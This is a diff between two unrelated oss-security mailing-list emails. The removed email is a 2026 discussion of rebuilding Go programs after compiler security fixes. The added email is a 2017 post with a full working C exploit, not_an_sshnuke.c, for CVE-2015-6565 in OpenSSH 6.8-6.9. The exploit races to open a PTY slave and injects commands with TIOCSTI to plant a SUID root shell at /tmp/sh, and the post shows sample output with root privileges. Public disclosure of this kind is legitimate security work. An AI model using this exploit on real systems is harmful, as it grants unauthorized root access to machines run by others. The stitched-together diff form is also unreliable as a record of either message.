@@ -1,4 +1,9 @@
-Received: (qmail 3691 invoked by uid 550); 17 Apr 2026 23:29:32 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3662" "Thursday" "26" "January" "2017" "10:07:24" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>" "137" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local  privesc on Linux" nil nil nil "1" "2017012609:07:24" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" (number mark "U       up201407890@ Jan 26  137/3662  " thread-indent "\"[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local  privesc on Linux\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 5706 invoked by uid 550); 26 Jan 2017 16:51:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,129 +12,154 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 13385 invoked from network); 17 Apr 2026 23:18:57 -0000
-From: Sam James <sam@gentoo.org>
+Received: (qmail 11674 invoked from network); 26 Jan 2017 12:22:26 -0000
+Message-ID: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
+Date: Thu, 26 Jan 2017 10:07:24 +0100
+From: up201407890@alunos.dcc.fc.up.pt
 To: oss-security@lists.openwall.com
-In-Reply-To: <545dcd82-c8f3-4702-ae81-8b5207791d95@gentoo.org>
-Organization: Gentoo
-References: <82bd2839-9db9-4ab4-9a7a-915e225a4450@oracle.com>
-	<20260410025803.GA20948@openwall.com> <aeILrE9J6sYYPmEh@xoff>
-	<545dcd82-c8f3-4702-ae81-8b5207791d95@gentoo.org>
-User-Agent: mu4e 1.14.0; emacs 31.0.50
-Date: Sat, 18 Apr 2026 00:18:44 +0100
-Message-ID: <87mrz1tbu3.fsf@gentoo.org>
 MIME-Version: 1.0
-Content-Type: multipart/signed; boundary="=-=-=";
-	micalg=pgp-sha512; protocol="application/pgp-signature"
-Subject: Re: [oss-security] Go 1.26.2 and Go 1.25.9 are released with 10
- security fixes
+Content-Type: multipart/mixed;
+	boundary="=_3hl3p6vb1fms"
+Content-Transfer-Encoding: 7bit
+User-Agent: Internet Messaging Program (IMP) H3 (4.2)
+X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
+Subject: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to
+	local  privesc on Linux
 
---=-=-=
-Content-Type: text/plain
+--=_3hl3p6vb1fms
+Content-Type: text/plain;
+	charset=ISO-8859-1;
+	DelSp="Yes";
+	format="flowed"
+Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
 
-Eli Schwartz <eschwartz@gentoo.org> writes:
+Hi list,
 
-> On 4/17/26 6:30 AM, Matthias Ferdinand wrote:
->> On Fri, Apr 10, 2026 at 04:58:03AM +0200, Solar Designer wrote:
->>> On Wed, Apr 08, 2026 at 04:24:34PM -0700, Alan Coopersmith wrote:
->>>> https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU announces:
->>>>> We have just released Go versions 1.26.2 and 1.25.9, minor point rele=
-ases.
->>>>>
->>>>> These releases include 10 security fixes following the security polic=
-y:
->>>
->>> This includes 2 issues in the compiler itself, which made some Go
->>> programs not memory safe:
->>   ...
->>=20
->>=20
->> I did not see any Linux distribution advisories for compiled Go programs
->> yet, but some projects using Go have released upates:
->>=20
->>   - https://rclone.org/changelog/#v1-73-4-2026-04-08
->>         Update to go 1.25.9 to fix multiple CVEs
->>=20
->>   - https://github.com/grafana/grafana/releases/tag/v12.4.3
->>         2026-04-14: Go: Update to 1.25.9
->>=20
->> I looked at https://github.com/gopasspw/gopass and
->> https://github.com/restic/restic, but they have not yet issued updated
->> releases.
->>=20
->> Perhaps the message did not spread wide enough. Or are many Go programs
->> just not affected?
->
->
-> Updated *releases* don't really make sense, generically. The bug is in
-> the compiler, not the package, so one would rebuild the existing release
-> with a new compiler. Consider how you handle this if a package had a
-> security vulnerability in the GCC version it was compiled in. Or, it
-> depended on libarchive and libarchive had a security release. Do you tag
-> a brand new version of rclone because the dependencies it was compiled
-> against got updated? No. Well, given gomodules or rust crate locking,
-> maybe, because those are "vendored libraries", but that is a bug in both
-> of those languages. :)
->
->
-> If I look at rclone, I see they only updated go 1.25.9 in the CI
-> workflow that builds precompiled binaries and attaches them as github
-> releases assets. The actual rclone release was noteworthy more for
-> fixing a denial of service that required pulling in a newer version of a
-> vendored library.
->
+I know I'm late to the party, but I was bored, so I decided to write=20=20
+an exploit for CVE-2015-6565 which affects OpenSSH 6.8-6.9
+It is mostly considered to be a "DoS", even though Jann Horn publicly=20=20
+told how it could be exploited for local privilege escalation, but I=20=20
+guess its either PoC||GTFO for users to update.
 
-For serious issues, it may make sense for projects distributing binaries
-(provided they know it was built by a buggy compiler) in the same way
-they might do for a vulnerable OpenSSL DLL in their Windows offering.
+ From https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-6565
 
-But yes, I agree, it'd be pretty annoying if every Go piece of software
-issued a new release that was a no-op and was just there to nudge you to
-rebuild it.
+"sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY=20=20
+devices, which allows local users to cause a denial of service=20=20
+(terminal disruption) or possibly have unspecified other impact by=20=20
+writing to a device, as demonstrated by writing an escape sequence."
 
-> On the compiler side of things, Gentoo Linux policy is to offer a
-> standard approach to rebuilding all packages that use golang:
->
-> $ emerge @golang-rebuild
->
-> which should be run after all golang updates that one suspects deserve a
-> global rebuild. Likely all golang updates because Reasons(tm). This is
-> just the name of the game when installing golang software -- the usual
-> rule of thumb is to assume all golang releases contain CVEs that need
-> fixing. It is regular like clockwork, so do people really need an
-> invitation to do so?
->
+I think the description should be updated.
 
-Right, the stdlib case is pretty common.
+$ gcc not_an_sshnuke.c -o not_an_sshnuke
+$ ./not_an_sshnuke /dev/pts/3
+[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh
+$ /tmp/sh --norc --noprofile -p
+# id
+euid=3D0(root) groups=3D0(root)
 
-> Other distros should be bumping the build number and recompiling the
-> package in place, using the same infrastructure otherwise used for
-> things like rebuilding ten thousand packages against a new major edition
-> of perl or python or ruby.
->
-> IIRC it is possible to determine which packages actually need rebuilding
-> for any given CVE, but to do so you need to locally extract the entire
-> recursive deps-included source code of every package, and run some
-> arcane undocumented `go ....` invocation. Functionally, what you're
-> doing is checking which programs link to an internal static library
-> distributed with the go compiler. (This is not exactly correct, but it
-> is a useful mental model.)
+Thanks,
+Federico Bento.
 
-sam
 
---=-=-=
-Content-Type: application/pgp-signature; name="signature.asc"
 
------BEGIN PGP SIGNATURE-----
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
 
-iQEBBAEWCgCpFiEEJaa7iN2bdkxrVUHCc4QJ9SDfkZAFAmniv9QbFIAAAAAABAAO
-bWFudTIsMi41KzEuMTIsMiwyXxSAAAAAAC4AKGlzc3Vlci1mcHJAbm90YXRpb25z
-Lm9wZW5wZ3AuZmlmdGhob3JzZW1hbi5uZXQyNUE2QkI4OEREOUI3NjRDNkI1NTQx
-QzI3Mzg0MDlGNTIwREY5MTkwDxxzYW1AZ2VudG9vLm9yZwAKCRBzhAn1IN+RkBoo
-AQDN6DFifuUJrlJg+dvhCPVOumgnzaU8BS2CUoQW19b0rgEA9dz+T5Bsh3XODgmr
-9RVo814HjrvWpylb0PzYnNvgaAk=
-=C0P9
------END PGP SIGNATURE-----
---=-=-=--
+--=_3hl3p6vb1fms
+Content-Type: text/x-csrc;
+	charset=UTF-8;
+	name="not_an_sshnuke.c"
+Content-Disposition: attachment;
+	filename="not_an_sshnuke.c"
+Content-Transfer-Encoding: quoted-printable
+
+/*=20
+ *  not_an_sshnuke.c
+ *
+ *  Federico Bento
+ *
+ *  up201407890@alunos.dcc.fc.up.pt
+ *  https://twitter.com/uid1000
+ *=20
+ *  OpenSSH 6.8-6.9 local privilege escalation - CVE-2015-6565
+ *=20=20
+ *  Considered mostly to be a "DoS", turns out to be a priv esc vuln.
+ *  https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-6565
+ *
+ *  Shoutz to Jann Horn for the detailed analysis
+ *  And also to all my elite colleagues, specially xSTF :)
+ *
+ *
+ *  $ gcc not_an_sshnuke.c -o not_an_sshnuke
+ *  $ ./not_an_sshnuke /dev/pts/3
+ *  [*] Waiting for slave device /dev/pts/3
+ *  [+] Got PTY slave /dev/pts/3
+ *  [+] Making PTY slave the controlling terminal
+ *  [+] SUID shell at /tmp/sh
+ *  $ /tmp/sh --norc --noprofile -p
+ *  # id
+ *  euid=3D0(root) groups=3D0(root)
+ *
+ */
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+=20=20=20=20=20
+int main(int argc, char *argv[])
+{
+     char *cmd =3D "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\n";
+     int pid, pts =3D -1;
+
+     if(argc !=3D 2) {
+          fprintf(stderr, "Usage: %s /dev/pts/X\n", argv[0]);
+	  fprintf(stderr, "Where X is next slave device to be created\n");
+	  return 1;
+     }
+=09
+     if(!access(argv[1], F_OK)) {
+          fprintf(stderr, "[-] %s device already exists\n", argv[1]);
+          return 1;
+     }
+
+     pid =3D fork();
+
+     if(pid < 0) {
+	  fprintf(stderr, "[-] fork failed\n");
+	  return 1;
+     }
+=09
+     if(pid =3D=3D 0) {
+          printf("[*] Waiting for slave device %s\n", argv[1]);
+=09=09
+	  /* win the race by opening the PTY slave before sshd's child */
+	  while(pts =3D=3D -1)
+	       pts =3D open(argv[1], O_WRONLY);=20
+
+	       printf("[+] Got PTY slave %s\n", argv[1]);
+               printf("[+] Making PTY slave the controlling terminal\n");
+=09=09
+	       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);
+	       setsid();
+               ioctl(0, TIOCSCTTY, 1);
+
+	       while(*cmd)
+	            ioctl(0, TIOCSTI, cmd++);
+     }
+
+     else {
+          wait(NULL);
+	  printf("[+] SUID shell at /tmp/sh\n");
+	  return 0;
+     }
+}=
+
+--=_3hl3p6vb1fms--
+
